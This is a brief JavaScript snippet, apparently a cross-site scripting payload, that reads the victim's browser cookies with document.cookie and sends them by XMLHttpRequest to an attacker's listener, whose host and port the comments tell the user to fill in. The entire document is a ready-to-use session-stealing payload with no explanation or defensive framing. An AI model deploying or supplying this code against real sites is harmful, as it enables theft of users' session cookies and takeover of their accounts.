var xhr = new XMLHttpRequest();
var cookie = encodeURIComponent(document.cookie);
var lhost = ""; // change with your listener ip or domain
var lport = ""; // change with your listener port
xhr.open("GET", 'https://' + lhost + ':' + lport + "/?cookie=" + cookie);
xhr.send();
